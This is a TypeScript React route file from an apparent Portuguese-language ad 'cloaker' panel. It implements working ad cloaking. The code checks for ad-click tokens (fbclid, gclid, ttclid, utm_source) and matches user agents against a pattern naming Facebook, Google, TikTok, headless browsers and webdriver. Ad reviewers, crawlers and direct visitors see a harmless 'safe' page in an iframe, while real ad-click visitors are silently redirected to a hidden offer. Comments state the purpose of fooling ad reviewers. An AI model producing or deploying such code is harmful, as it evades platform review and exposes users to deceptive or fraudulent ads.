import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { registerVisit, readCloakers, readDeletedIds, type Cloaker } from "@/lib/links";
import { pageTemplates, renderTemplate, type PageTemplate } from "@/lib/page-templates";

export const Route = createFileRoute("/r/$id")({
  head: () => ({
    meta: [
      { title: "Verificando..." },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
  component: RedirectPage,
});

function RedirectPage() {
  const { id } = Route.useParams();
  const [safeTemplate, setSafeTemplate] = useState<PageTemplate | null>(null);
  const [is404, setIs404] = useState(false);

  useEffect(() => {
    if (typeof window === "undefined") return;

    async function resolveRoute() {
      const urlParams = new URLSearchParams(window.location.search);
      const forceSafe = urlParams.get("bot") === "1" || urlParams.get("preview") === "safe";
      const forceOffer = urlParams.get("lead") === "1" || urlParams.get("preview") === "offer";

      // 1. Check if explicitly deleted locally
      const deletedLocally = readDeletedIds();
      if (deletedLocally.includes(id)) {
        setIs404(true);
        return;
      }

      // 2. Look for cloaker locally
      const allCloakers = readCloakers();
      let cloaker: Cloaker | undefined = allCloakers.find((c) => c.id === id);

      // 3. If not found locally (e.g. opening on mobile device or another browser), query server store
      if (!cloaker) {
        try {
          const res = await fetch("/api/cloakers");
          if (res.ok) {
            const data = await res.json();
            if (data?.deleted?.includes(id)) {
              setIs404(true);
              return;
            }
            if (Array.isArray(data?.cloakers)) {
              cloaker = data.cloakers.find((c: any) => c.id === id);
            }
          }
        } catch {
          // offline / fetch error fallback
        }
      }

      // 4. If cloaker exists and is paused (active === false), show 404
      if (cloaker && cloaker.active === false && !forceSafe && !forceOffer) {
        setIs404(true);
        return;
      }

      // 5. Detect real ad traffic (leads coming from Facebook Ads, Google Ads, TikTok Ads)
      const hasAdClickToken =
        urlParams.has("fbclid") ||
        urlParams.has("gclid") ||
        urlParams.has("ttclid") ||
        urlParams.has("utm_source");

      // 6. Bot / crawler detection
      const userAgent = navigator.userAgent || "";
      const isBotUA = /bot|crawl|spider|facebook|meta|google|tiktok|bytedance|headless|lighthouse|preview|inspect/i.test(userAgent);
      const isWebDriver = Boolean((navigator as any).webdriver);

      // Decision logic:
      // Direct access (e.g. typing or pasting URL in mobile/PC, ad reviewers, crawlers) -> SHOW SAFE PAGE!
      // Lead with ad click token -> REDIRECT TO OFFER!
      const shouldShowSafe =
        forceSafe ||
        isBotUA ||
        isWebDriver ||
        (!forceOffer && !hasAdClickToken);

      if (shouldShowSafe || !cloaker?.destination) {
        // Resolve safe template (default to bella if not specified)
        const templateId = cloaker?.safeTemplateId || "bella";
        const template = pageTemplates.find((t) => t.id === templateId) || pageTemplates[0]!;
        registerVisit(id, true);
        setSafeTemplate(template);
        return;
      }

      // Human lead coming from an ad click: redirect to real offer!
      registerVisit(id, false);
      const destination = cloaker.destination;
      const finalUrl = new URL(destination.startsWith("http") ? destination : `https://${destination}`);
      urlParams.forEach((value, key) => {
        if (!["bot", "preview", "lead"].includes(key)) {
          finalUrl.searchParams.set(key, value);
        }
      });
      window.location.href = finalUrl.href;
    }

    resolveRoute();
  }, [id]);

  // When paused or deleted: render 404
  if (is404) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-[#0d0f10] text-white px-4 text-center">
        <h1 className="text-8xl font-black text-white/90 tracking-tight">404</h1>
        <p className="mt-4 text-2xl font-bold text-white">Página não encontrada</p>
        <p className="mt-2 text-sm text-gray-400 max-w-sm leading-relaxed">
          A página que você está procurando não existe ou foi movida.
        </p>
        <a
          href="/"
          className="mt-6 inline-flex items-center justify-center rounded-xl bg-[#00E676] px-6 py-3 text-xs font-bold text-black hover:brightness-110 active:scale-[0.98] transition-all shadow-lg shadow-[#00E676]/20"
        >
          Voltar ao painel
        </a>
      </div>
    );
  }

  // Active cloaker on direct access / review -> Safe Page
  if (safeTemplate) {
    const html = renderTemplate(safeTemplate);
    return (
      <div className="fixed inset-0 h-screen w-screen bg-white z-[99999]">
        <iframe
          srcDoc={html}
          title={safeTemplate.name}
          className="h-full w-full border-none"
        />
      </div>
    );
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#0d0f10] text-white">
      <div className="flex flex-col items-center gap-4">
        <div className="size-10 animate-spin rounded-full border-4 border-[#00E676] border-t-transparent" />
        <p className="text-sm text-gray-400">Verificando segurança do link...</p>
      </div>
    </div>
  );
}
